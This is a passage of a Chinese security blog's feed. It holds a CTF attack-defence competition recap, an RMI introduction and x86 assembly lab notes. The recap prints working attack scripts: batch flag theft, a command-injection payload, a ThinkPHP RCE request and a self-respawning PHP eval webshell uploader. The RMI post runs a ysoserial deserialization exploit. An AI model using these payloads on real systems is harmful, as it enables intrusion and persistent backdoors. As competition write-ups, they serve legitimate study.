        &lt;p&gt;一直不太清楚apache的配置文件，简单记录一下&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/etc/apache2&lt;/code&gt; 下的文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;apache2.conf&lt;/code&gt; 是主配置文件，之后的 &lt;code&gt;available&lt;/code&gt; 代表可用的, 
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="apache" scheme="http://prontosil.com/tags/apache/"/>
    
  </entry>
  
  <entry>
    <title>星盟3月AWD比赛</title>
    <link href="http://prontosil.com/posts/f1d265cd/"/>
    <id>http://prontosil.com/posts/f1d265cd/</id>
    <published>2020-03-14T10:37:47.000Z</published>
    <updated>2020-03-15T11:42:38.523Z</updated>
    
    <content type="html"><![CDATA[<p>又双叒叕的打了一次AWD比赛，简单地总结一下</p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><h3 id="直接读flag"><a href="#直接读flag" class="headerlink" title="直接读flag"></a>直接读flag</h3><p>最开始放了web2，ssh连上去，d盾没扫出什么东西</p><p>然后开始一个个看(现在都流行不放shell，直接给flag的2333)</p><p><img src="/posts/f1d265cd/1584182423201.png" alt></p><p>丢给群里的其他师傅开始写批量</p><pre><code class="python">import requestsimport report = [20180,20280,20380,20480,20580,20680,20780,20880,20980,21080,21180,21280,21380,21480,21580,21680,21780,21880,21980,22080,22180,22280,22380,22480]url = &#39;http://ip:{port}/login.php&#39;for i in port:    r = requests.get(url=url.format(port=str(i)))    if r.status_code == 200:        try:            print(re.findall(r&quot;(flag{.*})&quot;,r.text)[0])        except IndexError:            pass</code></pre><p>批量交flag(后来发现平台有设置csrf token。导致无法批量交。)</p><pre><code class="python">send_url = &#39;http://ip:8001/api/v1/challenges/attempt&#39;cookie = {&#39;Cookie&#39;: &#39;session=be71fde5-8749-46b2-8ac6-fb30b0ec93bb; PHPSESSID=pdq189at1p9g6478tmt8urkng2&#39;}for flag in submit_flag:    data = {&quot;challenge_id&quot;:2,&quot;submission&quot;:flag}    requests.post(url=send_url,data=data,cookies=cookie)</code></pre><p>最后合并为十分钟交一次</p><pre><code class="python">import requestsimport refrom time import sleepwhile True:    port = [20180,20280,20380,20480,20580,20680,20780,20880,20980,21080,21180,21280,21380,21480,21580,21680,21780,21880,21980,22080,22180,22280,22380,22480]    url = &#39;http://ip:{port}/login.php&#39;    submit_flag = []    for i in port:        r = requests.get(url=url.format(port=str(i)))        if r.status_code == 200:            try:                submit_flag.append(re.findall(r&quot;(flag{.*})&quot;,r.text)[0])            except IndexError:                pass    send_url = &#39;http://ip:8001/api/v1/challenges/attempt&#39;    cookie = {&#39;Cookie&#39;: &#39;session=be71fde5-8749-46b2-8ac6-fb30b0ec93bb; PHPSESSID=pdq189at1p9g6478tmt8urkng2&#39;}    for flag in submit_flag:        data = {&quot;challenge_id&quot;:2,&quot;submission&quot;:flag}        req = requests.post(url=send_url,data=data,cookies=cookie)        if &#39;incorrect&#39; not in req.text:            print(&#39;提交正确&#39;)    sleep(600)</code></pre><p>ps.赛后师傅说并没有换cookie，用下面的代码就能批量交。</p><p><img src="/posts/f1d265cd/1584186516112.png" alt></p><h3 id="后台任意文件上传"><a href="#后台任意文件上传" class="headerlink" title="后台任意文件上传"></a>后台任意文件上传</h3><p>看到 <code>test.sql</code> 中是有用户名和密码的，登录之后有上传点</p><p>黑名单只有这几个。。而且htaccess还写错了，php5,php7,phtml也都没有过滤，不过上传之后还是会重命名，算是也过滤了 <code>.htaccess</code> </p><pre><code>$black_list = [&quot;ini&quot;,&quot;htacces&quot;,&quot;php&quot;,&quot;ph3&quot;,&quot;html&quot;];$ext=pathinfo($name)[&#39;extension&#39;];$ext =strtolower($ext);</code></pre><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><h3 id="md文件解析漏洞"><a href="#md文件解析漏洞" class="headerlink" title="md文件解析漏洞"></a>md文件解析漏洞</h3><p>这个web套路好深2333</p><p>d盾可以扫到一个shell，但是是在markdown文件中，还有一个是库中的回调函数</p><p><img src="/posts/f1d265cd/1584182744449.png" alt></p><p>最开始以为是d盾误报，结果后来看了一眼 <code>.htaccess</code></p><pre><code>AddType application/x-httpd-php .html .md</code></pre><p>居然将markdown文件解析为php….这个思路挺强的</p><p>但是由于发现的比较晚，貌似都修好了</p><h3 id="ping命令执行"><a href="#ping命令执行" class="headerlink" title="ping命令执行"></a>ping命令执行</h3><pre><code class="php">function waf($str){    $str=str_replace(&#39; &#39;,&#39;&#39;,$str);    $str=str_replace(&#39;;&#39;,&#39;&#39;,$str);    $str=str_replace(&#39;|&#39;,&#39;&#39;,$str);    return $str;}function ping($host){    $host=waf($host);    var_dump($host);    system(&quot;ping -c 1 $host&quot;);}if(isset($_REQUEST[1]))    ping($_REQUEST[1]);</code></pre><p>这个命令执行倒是挺简单的， <code>&amp;cat&lt;/flag</code> 即可</p><pre><code class="python">import requestsimport report = [30180,30280,30680,30780,30980,31180,31280,31380,31480,31580,31780,31880,31980,32080,32180,32280,32380,32480,31080,30580,30380,30480,30880,31680]url = &#39;http://ip:{port}/common/function.php?1=&amp;cat&lt;/flag&#39;for i in port:    r = requests.get(url=url.format(port=str(i)))    try:        print(re.findall(r&quot;(flag{.*})&quot;,r.text)[0])    except IndexError:        pass</code></pre><h3 id="后台文件上传"><a href="#后台文件上传" class="headerlink" title="后台文件上传"></a>后台文件上传</h3><p>审计源码发现 <code>admin, admin</code>  即可登陆</p><p>然后有文件上传点，直接传shell.md即可解析</p><p>事后写了一个批量上传不死马的脚本</p><pre><code class="python">import requestsimport hashlibbs_webshell = &quot;&quot;&quot;&lt;?php    ignore_user_abort(true);    set_time_limit(0);    unlink(__FILE__);    $file = &#39;%s&#39;;    $code = &#39;&lt;?php if($_POST[&quot;pass&quot;]==&quot;%s&quot;){@eval($_POST[1]);}?&gt;&#39;;    while (1) {        file_put_contents($file, $code);        system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; %s&#39;);        usleep(50);    }?&gt;&quot;&quot;&quot;secret = &quot;pxy&quot;shell_path = &quot;.pxy.php&quot;def md5_hash(s):    return hashlib.md5(s.encode()).hexdigest()def generateShell(ip):    pwd = md5_hash(secret + ip)    shell = bs_webshell % (shell_path, pwd, shell_path)    print(shell)    return shelldef checkShell(ip,shell_path):    url = &#39;http://%s/%s&#39; % (ip, shell_path)    try:        res = requests.get(url, timeout=3)    except:        pass    pwd = md5_hash(secret + ip)    res = requests.post(url, data={&#39;pass&#39;: pwd, &#39;1&#39;: &#39;echo(123);&#39;})    print(res.text)    if res.text == &#39;123&#39;:        print(&#39;[+]&#39;+ip,&#39;Check OK&#39;)ports = [30180,30280,30380,30480,30580,30680,30780,30880,30980,31080,31180,31280,31380,31480,31580,31680,31780,31880,31980,33080,32180,32280,32380,32480]ip = &quot;127.0.0.1&quot;for i in ports:    files = {&quot;pic&quot;:(&#39;shell.md&#39;, generateShell(ip), &#39;application/octet-stream&#39;)}    cookies = dict(PHPSESSID=&#39;fjue55il5q0v90fp8l66us6hq0&#39;)    url = &quot;http://&quot;+ip+&quot;:&quot;+str(i)    url_upload = url+&quot;/index.php?c=User&amp;a=upload&quot;    r = requests.post(url=url_upload,files=files, cookies=cookies)    if b&quot;successfully&quot; in r.content:        print(&quot;[+]&quot;+ip+&quot;:&quot;+str(i)+&quot; upload success&quot;)    url_1 = url + &quot;/upload/admin_shell.md&quot;    try:        r = requests.get(url_1,timeout=2)    except requests.exceptions.ReadTimeout:        checkShell(ip, &quot;upload/.pxy.php&quot;)</code></pre><p>后来研究发现，其实文件上传不仅仅是</p><pre><code>/index.php?c=User&amp;a=upload</code></pre><p>也可以</p><pre><code>/index.php?c=File&amp;a=save</code></pre><p>因为 <code>index.php</code> 是这样写的</p><pre><code class="php">$c=isset($_GET[&#39;c&#39;])?$_GET[&#39;c&#39;]:&#39;User&#39;;$a=isset($_GET[&#39;a&#39;])?$_GET[&#39;a&#39;]:&#39;Index&#39;;$obj=run_c($c);run_a($obj,$a);</code></pre><p>URL格式为：</p><pre><code>http://localhost/index.php?c=User&amp;a=home</code></pre><p>就是可以调用任意类的任意方法</p><p>ps比赛的时候我们是这么想的：</p><p>看到 <code>base.php</code> 中实例化了 <code>Smarty</code> </p><p><img src="/posts/f1d265cd/1584186763035.png" alt></p><p>之后看到这里有一处eval。</p><p><img src="/posts/f1d265cd/1584186784920.png" alt></p><p>于是就开始想能不能getshell，但是无果。</p><h3 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h3><p>感谢a2u13师傅</p><p>还是接前面的分析，可以执行任意类的任意方法。但是那个地方是字符串拼接！。</p><p>所以可以直接通过 <code>;</code> 进行命令注入</p><p><img src="/posts/f1d265cd/1584188249191.png" alt></p><p>File类需要登陆才能使用，换一个 <code>User</code>类就行</p><p><img src="/posts/f1d265cd/1584188382658.png" alt></p><p>比赛的时候确实没往这块想，还是要加强代码审计啊</p><h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><pre><code class="php">&lt;?phpclass home{    public $method;    public $args;    function __construct($method, $args) {        $this-&gt;method = $method;        $this-&gt;args = $args;    }    function __destruct(){        var_dump($this-&gt;method);        ($this-&gt;method)($this-&gt;args);    } }     $a=$_REQUEST[&#39;a&#39;];    @unserialize($a);     ?&gt;</code></pre><p>看上去挺像反序列化的，但是</p><pre><code>($this-&gt;method)($this-&gt;args);</code></pre><p>这里是报错的，所以比赛的时候没法利用</p><p>复盘的时候才意识到原来只有php7才可以这么用</p><p>经过测试发现只能直接动态调用system函数，eval和assert都是不行的</p><p><img src="/posts/f1d265cd/1584191203655.png" alt></p><p><img src="/posts/f1d265cd/1584191226590.png" alt="eval是不行的"></p><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>web1是最后放出来的，为了提高挑战性不给ssh密码。</p><p>但是稍微看两眼就会发现是tp5.0写的，还开了debug，于是直接RCE了</p><pre><code class="python">import requestsimport report = [10180,10280,10380,10480,10580,10680,10780,10880,10980,11080,11180,11280,11380,11480,11580,11680,11780,11880,11980,12080,12180,12280,12380,12480]url_flag = &#39;http://ip:{port}/public/index.php?s=captcha&#39;data = {&#39;_method&#39;:&#39;__construct&#39;,        &#39;filter[]&#39;:&#39;system&#39;,        &#39;method&#39;:&#39;get&#39;,&#39;get[]&#39;:&#39;cat /flag&#39;}for i in port:    r = requests.post(url=url_flag.format(port=str(i)),data=data)    if r.status_code == 200:        try:            print((re.findall(r&quot;(flag{.*})&quot;,r.text)[0]))        except IndexError:            pass</code></pre><p>这一波flag还是挺舒服的，但是遗憾的是没法修啊。。</p><p><img src="/posts/f1d265cd/1584183311879.png" alt></p><p>不过后来意识到可以直接将 <code>/var/www/html</code> 下的文件打包下载，还可以自己往里面写shell然后蚁剑连接进行修改。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;又双叒叕的打了一次AWD比赛，简单地总结一下&lt;/p&gt;
&lt;h2 id=&quot;web2&quot;&gt;&lt;a href=&quot;#web2&quot; class=&quot;headerlink&quot; title=&quot;web2&quot;&gt;&lt;/a&gt;web2&lt;/h2&gt;&lt;h3 id=&quot;直接读flag&quot;&gt;&lt;a href=&quot;#直接读flag&quot;
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="AWD" scheme="http://prontosil.com/tags/AWD/"/>
    
      <category term="总结" scheme="http://prontosil.com/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>RMI入门</title>
    <link href="http://prontosil.com/posts/aba5931d/"/>
    <id>http://prontosil.com/posts/aba5931d/</id>
    <published>2020-03-12T14:05:48.000Z</published>
    <updated>2020-03-22T08:13:42.616Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>RMI（Remote Method Invocation）为远程方法调用，是允许运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法。 这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在<strong>网络上的不同计算机中,</strong>它的底层是由<strong>socket</strong>和<strong>java序列化和反序列化</strong>支撑起来的。</p><p>Java RMI：Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。</p><p>我们知道远程过程调用（Remote Procedure Call, RPC）可以用于一个进程调用另一个进程（很可能在另一个远程主机上）中的过程，从而提供了过程的分布能力。Java 的 RMI 则在 RPC 的基础上向前又迈进了一步，即提供分布式对象间的通讯。</p><h3 id="如何找到类？"><a href="#如何找到类？" class="headerlink" title="如何找到类？"></a>如何找到类？</h3><p>类似DNS中域名和IP的对应关系，RMI中有一个 <strong>RMIRegistry</strong> 来提供这种对应关系，客户端通过访问 <strong>RMIRegistry</strong> 来获得对应的类进行加载</p><h3 id="数据是如何传递的？"><a href="#数据是如何传递的？" class="headerlink" title="数据是如何传递的？"></a>数据是如何传递的？</h3><p>当客户端通过RMI注册表找到一个远程接口的时候，所得到的其实是远程接口的一个动态代理对象。当客户端调用其中的方法的时候，方法的参数对象会在序列化之后，传输到服务器端。服务器端接收到之后，进行反序列化得到参数对象。并使用这些参数对象，在服务器端调用实际的方法。调用的返回值Java对象经过序列化之后，再发送回客户端。客户端再经过反序列化之后得到Java对象，返回给调用者。这中间的序列化过程对于使用者来说是透明的，由动态代理对象自动完成。</p><p>所以客户端并不是直接和服务端进行通信的，而是由客户端代理和服务端代理进行通信</p><p>如下图：RMI服务器在 <strong>RMIRegistry</strong> 中进行注册，客户端去查找，然后再进行RMI调用</p><p><img src="/posts/aba5931d/1584862271326.png" alt></p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>Hello接口</p><pre><code class="java">import java.rmi.Remote;import java.rmi.RemoteException;public interface Hello extends Remote{    public String hello() throws RemoteException;}</code></pre><p>对应的实现</p><pre><code class="java">import java.io.Serializable;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;/** * @description: Hello实现 * @author: Pxy * @create: 2020-03-12 22:15 **/public class RemoteHello extends UnicastRemoteObject implements Hello{    protected RemoteHello() throws RemoteException {        super();    }    public String  hello() throws RemoteException {        return &quot;hello&quot;;    }}</code></pre><p>创建一个服务端</p><pre><code class="java">import java.rmi.Naming;import java.rmi.Remote;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.server.UnicastRemoteObject;/** * @description: RMI服务器 * @author: Pxy * @create: 2020-01-20 08:45 **/public class RMIServer {    public void start() throws Exception{        RemoteHello h = new RemoteHello();        LocateRegistry.createRegistry(1099);        Naming.bind(&quot;rmi://127.0.0.1:1099/Hello&quot;, h);    }    public static void main(String[] args) throws Exception {        RMIServer rmiServer = new RMIServer();        rmiServer.start();    }}</code></pre><p>客户端进行访问</p><pre><code class="java">import java.rmi.Naming;/** * @description: RMI客户端 * @author: Pxy * @create: 2020-01-20 08:57 **/public class TrainMain {    public static void main(String[] args) throws Exception {        Hello hello = (Hello) Naming.lookup(&quot;rmi://127.0.0.1/Hello&quot;);        System.out.println(hello.hello());    }}</code></pre><p>（最好能放在两个不同的文件夹</p><p>抓包看一些通信的数据</p><p><img src="/posts/aba5931d/1584863994742.png" alt></p><p>看到 return data, aced 就是java序列化后的标志</p><p><img src="/posts/aba5931d/1584864050735.png" alt></p><h2 id="攻击RMI服务端"><a href="#攻击RMI服务端" class="headerlink" title="攻击RMI服务端"></a>攻击RMI服务端</h2><p>这里用的java7</p><h3 id="JRMP"><a href="#JRMP" class="headerlink" title="JRMP"></a>JRMP</h3><blockquote><p>Java远程方法协议（英语：Java Remote Method Protocol，JRMP）是特定于Java技术的、用于查找和引用远程对象的协议。这是运行在Java远程方法调用（RMI）之下、TCP/IP之上的线路层协议（英语：Wire protocol）。</p></blockquote><p>通俗点解释，它就是一个协议，一个在TCP/IP之上的线路层协议，一个RMI的过程，是用到JRMP这个协议去组织数据格式然后通过TCP进行传输，从而达到RMI，也就是远程方法调用</p><p>由于JRMP协议在传输过程中的数据是序列化后的，不管是服务端还是客户端，当接收到JRMP协议数据时，都会把序列化的数据进行反序列化的话，这样就可以互相对打</p><h3 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h3><p>创建一个 RMI 服务：</p><pre><code class="java">import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;/** * @description: 创建一个RMI服务 * @author: Pxy * @create: 2020-03-22 15:18 **/public class App {    public static void main(String[] args) {        try {            LocateRegistry.createRegistry(1099);        } catch (RemoteException e) {            e.printStackTrace();        }        while(true);    }}</code></pre><p>在这个服务器上(其实都是在本地，只是区分一下)，存在有漏洞的Apache Common Collections库，那么就可以直接用 </p><pre><code>java -cp ysoserial-master-30099844c6-1.jar ysoserial.exploit.JRMPClient 127.0.0.1 1099 CommonsCollections1 calc.exe</code></pre><p><img src="/posts/aba5931d/1584864819094.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://wulidecade.cn/2020/02/15/RMI%E5%85%A5%E9%97%A8/#more" target="_blank" rel="noopener">RMI入门</a></p><p><a href="https://xz.aliyun.com/t/7079#toc-3" target="_blank" rel="noopener">一篇写的很清楚的文章</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基础知识&quot;&gt;&lt;a href=&quot;#基础知识&quot; class=&quot;headerlink&quot; title=&quot;基础知识&quot;&gt;&lt;/a&gt;基础知识&lt;/h2&gt;&lt;p&gt;RMI（Remote Method Invocation）为远程方法调用，是允许运行在一个Java虚拟机的对象调用运行在另一
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://prontosil.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="jndi" scheme="http://prontosil.com/tags/jndi/"/>
    
  </entry>
  
  <entry>
    <title>汇编从入门到入土五</title>
    <link href="http://prontosil.com/posts/7fad3d80/"/>
    <id>http://prontosil.com/posts/7fad3d80/</id>
    <published>2020-03-10T13:35:17.000Z</published>
    <updated>2020-03-25T02:13:59.613Z</updated>
    
    <content type="html"><![CDATA[<h2 id="课后实验"><a href="#课后实验" class="headerlink" title="课后实验"></a>课后实验</h2><h3 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h3><pre><code class="asm">assume cs:code,ds:data,ss:stackdata segment    dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987hdata endsstack segment    dw 0,0,0,0,0,0,0,0stack endscode segmentstart:    mov ax,stack    mov ss,ax    mov sp,16    mov ax,data    mov ds,ax    push ds:[0]    push ds:[2]    pop ds:[2]    pop ds:[0]    mov ax,4c00h    int 21hcode endsend start</code></pre><ol><li>程序返回前,data段中的数据如下：</li></ol><p><img src="/posts/7fad3d80/1585098727870.png" alt></p><ol start="2"><li>程序返回前，cs = 076C, ss=076B,ds=076A</li><li>code段地址如果为X，data段地址为 X-32, stack段地址为X-16</li></ol><h3 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h3><pre><code class="asm">assume cs:code,ds:data,ss:stackdata segment    dw 0123h,0456hdata endsstack segment    dw 0,0stack endscode segmentstart:    mov ax,stack    mov ss,ax    mov sp,16    mov ax,data    mov ds,ax    push ds:[0]    push ds:[2]    pop ds:[2]    pop ds:[0]    mov ax,4c00h    int 21hcode endsend start</code></pre><ol><li>执行程序，返回前，data段中的数据为多少</li></ol><p><img src="/posts/7fad3d80/1585099444358.png" alt></p><ol start="2"><li>程序返回前，cs=076C,ss=076B,ds=076A</li><li>code段地址为X，data段地址为 X-32, stack段地址为 X- 16</li><li></li></ol><h3 id="实验五"><a href="#实验五" class="headerlink" title="实验五"></a>实验五</h3><pre><code class="asm">assume cs:codea segment    db 1,2,3,4,5,6,7,8a endsb segment    db 1,2,3,4,5,6,7,8b endsc segment    db 0,0,0,0,0,0,0,0c endscode segmentstart:    mov ax,a    mov ds,ax    mov ax,b    mov ss,ax    mov ax,c    mov es,ax    mov cx,8    mov bx,0    mov dl,0s:    add dl,ds:[bx]    add dl,ss:[bx]    mov es:[bx], dl    mov dl,0    inc bx    loop s    mov ax,4c00h    int 21hcode endsend start</code></pre><p>将a和b中的数据求和，放到c里面</p><p>执行完成后放在 es 中</p><p><img src="/posts/7fad3d80/1585101726819.png" alt></p><h3 id="实验六"><a href="#实验六" class="headerlink" title="实验六"></a>实验六</h3><pre><code class="asm">assume cs:codea segment         dw 1,2,3,4,5,6,7,8,9,0ah,0bh,0ch,0dh,0eh,0fh,0ffha endsb segment    dw 0,0,0,0,0,0,0,0b endscode segmentstart:    mov ax,b    mov ss,ax    mov sp,10h    mov ax,a    mov ds,ax    mov cx,8    mov bx,0s:    mov dx,ds:[bx]    push dx    inc bx    inc bx    loop s    mov ax,4c00h    int 21hcode endsend start</code></pre><p>将a中的前8个字型数据逆序压入到b中，(注意字型数据是小端存储的)</p><p><img src="/posts/7fad3d80/1585102355893.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;课后实验&quot;&gt;&lt;a href=&quot;#课后实验&quot; class=&quot;headerlink&quot; title=&quot;课后实验&quot;&gt;&lt;/a&gt;课后实验&lt;/h2&gt;&lt;h3 id=&quot;实验一&quot;&gt;&lt;a href=&quot;#实验一&quot; class=&quot;headerlink&quot; title=&quot;实验一&quot;&gt;&lt;/a&gt;实验
      
    
    </summary>
    
    
      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="汇编" scheme="http://prontosil.com/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>汇编从入门到入土四</title>
    <link href="http://prontosil.com/posts/624f5fc5/"/>
    <id>http://prontosil.com/posts/624f5fc5/</id>
    <published>2020-03-10T13:32:20.000Z</published>
    <updated>2020-03-25T02:32:53.161Z</updated>
    
    <content type="html"><![CDATA[<p>BX 寄存器在内存寻址的作用</p><p><img src="/posts/624f5fc5/1583847161633.png" alt></p><pre><code>mov ax, 2000Hmov ds,axmov bx,1000Hmov ax,[bx]  ; AX=00BEHinc bxinc bxmov [bx],ax  ; BX=1002inc bxinc bxmov [bx],ax  ; BX=1004inc bxmov [bx],al  ; BX=1005inc bx       mov [bx],al  ; BX=1006</code></pre><p>最后得到的内存分布</p><p><img src="/posts/624f5fc5/1583847171666.png" alt></p><h2 id="loop指令的使用"><a href="#loop指令的使用" class="headerlink" title="loop指令的使用"></a>loop指令的使用</h2><pre><code>assume cs:codecode segment    mov ax,2    mov cx,11s:  add ax,ax    loop s</code></pre><p>cx 作为循环的计数器</p><p>计算乘法，123*236</p><pre><code>assume cs:codecode segment    mov ax,0    mov cx,236s:  add ax,123    loop s    mov ax,4c00h    int 21hcode endsend</code></pre><blockquote><p>注意：在汇编程序中，数据不能以字母开头</p></blockquote><p><code>g</code> 指令可以直接执行到指定的位置</p><p><code>p</code> 会自动重复直到 <code>cx == 0</code> 为止</p><h2 id="Debug和masm对指令的不同处理"><a href="#Debug和masm对指令的不同处理" class="headerlink" title="Debug和masm对指令的不同处理"></a>Debug和masm对指令的不同处理</h2><p>在汇编源程序中，我们需要这么写</p><pre><code>mov ax, 2000hmov ds, axmov al, ds:[0]</code></pre><p>如果没有指定段寄存器</p><pre><code>mov al,[0]</code></pre><p>则 <code>masm</code> 理解成</p><pre><code>mov al, 0</code></pre><p>当然如果是寄存器的话</p><pre><code>mov al, [bx]</code></pre><p>则段寄存器默认存在是 ds</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>计算 <code>ffff:0 ~ ffff:b</code> 单元中的数据的和，结果存储在 dx 中</p><p>由于每一个数据都是字节的，不能直接加到16位的寄存器dx中，那么我们是不是可以用dh和dl呢，但是这样可能导致进位丢失</p><p>所以我们需要将8位的数据赋值到16位寄存器然后再与dx相加</p><pre><code class="x86asm">assume cs:codecode segment    mov ax,0ffffh ; 注意数字不能以字母开头    mov ds,ax    mov bx,0 ;首先让 ds:bx 指向 ffff:0    mov dx,0    mov cx,12 ;进行12次循环s:  mov al,[bx]    mov ah,0  ;不要忘记给ah置0！    add dx,ax    inc bx    loop s    mov ax,4c00h    int 21hcode endsend</code></pre><h2 id="如何使用内存空间"><a href="#如何使用内存空间" class="headerlink" title="如何使用内存空间"></a>如何使用内存空间</h2><pre><code>assume cs:codecode segment    mov ax,0    mov ds,ax    mov ds:[26h], ax    mov ax,4c00h    int 21hcode endsend</code></pre><p>程序出问题了，无法继续运行</p><p><img src="/posts/624f5fc5/1583847197500.png" alt></p><p>DOS方式下，一般情况，<code>0:200 ~ 0:2ff</code> 空间中没有系统或其他程序的数据或代码</p><h2 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h2><p>将内存 ffff:0 ~ ffff:b 单元中的数据复制到 0:200 ~ 0:20b 单元中</p><p>可以将两个段的地址保存到两个寄存器中</p><pre><code>assume cs:codecode segment    mov ax,0ffffh    mov ds,ax     mov ax,0020h    mov es,ax    mov bx,0    mov cx,12s:  mov dl,[bx]    mov es:[bx],dl    inc bx    loop s    mov ax,4c00h    int 21hcode endsend</code></pre><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><ol><li>编程，向内存 0:200 ~0:23F 依次传送数据 0 ~63(3FH)</li></ol><p>代码</p><pre><code>assume cs:codecode segment    mov ax,0    mov ds,ax    mov bx,200h    mov cx,40h    mov ax,0s:  mov [bx],ax    inc ax    inc bx    loop s    mov ax, 4c00h    int 21hcode endsend</code></pre><p>运行结果</p><p><img src="/posts/624f5fc5/1583847221964.png" alt></p><ol start="2"><li>编程，向内存 0:200~0:23F 一次传递数据 0~63(3FH),程序中只能使用9条指令<br>如果只能用9条指令，那么可以这么改<pre><code>assume cs:codecode segment mov ax,0 mov ds,ax mov bx,0 mov cx,40hs:  mov [bx+200h],bx ;去掉了 ax，只用bx一个寄存器就可以做到 inc bx loop s mov ax, 4c00h int 21hcode endsend</code></pre>运行结果</li></ol><p><img src="/posts/624f5fc5/1583847232334.png" alt></p><ol start="3"><li><pre><code>assume cs:codecode segment mov ax,cs mov ds,ax mov ax,0020h mov es,ax mov bx,0 mov cx,20hs:  mov al,[bx] mov es:[bx],al inc bx loop s mov ax,4c00h int 21hcode endsend</code></pre></li></ol><p><img src="/posts/624f5fc5/1583847251042.png" alt></p><p>于是可以推测出 CX=17h</p><p>完整代码如下</p><pre><code>assume cs:codecode segment        mov ax,cs    mov ds,ax    mov ax,0020h    mov es,ax    mov bx,0    mov cx,17hs:  mov al,[bx]    mov es:[bx],al    inc bx    loop s    mov ax,4c00h    int 21hcode endsend</code></pre><p><img src="/posts/624f5fc5/1583847262812.png" alt></p><p>可以看到成功复制了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;BX 寄存器在内存寻址的作用&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/posts/624f5fc5/1583847161633.png&quot; alt&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mov ax, 2000H
mov ds,ax
mov bx,1000H
mov ax,[bx]  
      
    
    </summary>
    
    
      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="汇编" scheme="http://prontosil.com/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>汇编从入门到入土三</title>
    <link href="http://prontosil.com/posts/2e9d33db/"/>
    <id>http://prontosil.com/posts/2e9d33db/</id>
    <published>2020-03-10T13:29:29.000Z</published>
    <updated>2020-03-10T14:46:52.900Z</updated>
    
    <content type="html"><![CDATA[<h2 id="从汇编程序开始"><a href="#从汇编程序开始" class="headerlink" title="从汇编程序开始"></a>从汇编程序开始</h2><pre><code class="x86asm">assume cs:codesgcodesg segment    mov ax,0123H    mov bx,0456H    add ax,bx    add ax,ax    mov ax,4c00H    int 21Hcodesg endsend</code></pre><p>伪指令</p><pre><code>段名 segment段名 ends</code></pre><p><code>end</code> 和 <code>ends</code> 不一样， end标记整个程序的结束<br><code>assume</code> 将有特定用途的段和相关的段寄存器关联起来</p><p>程序返回</p><pre><code>    mov ax,4c00H    int 21H</code></pre><p>编写代码，使用 MASM.exe 编译，然后使用 LINK.exe 进行链接</p><p><img src="/posts/2e9d33db/1583847029418.png" alt></p><p><img src="/posts/2e9d33db/1583847034341.png" alt></p><p>运行当然是没有结果的，我们需要使用 <code>debug</code> 调试</p><h2 id="可执行文件的加载过程"><a href="#可执行文件的加载过程" class="headerlink" title="可执行文件的加载过程"></a>可执行文件的加载过程</h2><p>程序加载的时候，找到一个段地址 <code>SA:0000</code>,程序从 <code>SA+10H:0000</code> 处开始运行，<code>SA</code> 存放在 ds寄存器中</p><p>刚加载进内存中时，</p><p><img src="/posts/2e9d33db/1583847094408.png" alt></p><p>此时看到 ds 寄存器的内容为 <code>075AH</code> ,所以程序的物理地址就是 ds+10h ,正好符合<br>在int21 时需要使用 p命令执行</p><p><img src="/posts/2e9d33db/1583847103427.png" alt></p><h2 id="实验3-编译链接跟踪"><a href="#实验3-编译链接跟踪" class="headerlink" title="实验3 编译链接跟踪"></a>实验3 编译链接跟踪</h2><pre><code class="x86asm">assume cs:codesgcodesg segment    mov ax,2000H  ; AX=2000H    mov ss,ax     ; SS=2000H    mov sp,0      ; SP=0    add sp,10     ; SP=10    pop ax        ; SP=000CH, AX=076AH    pop bx        ; SP=000EH, BX=7206H    push ax       ; SP=000CH    push bx       ; SP=000AH 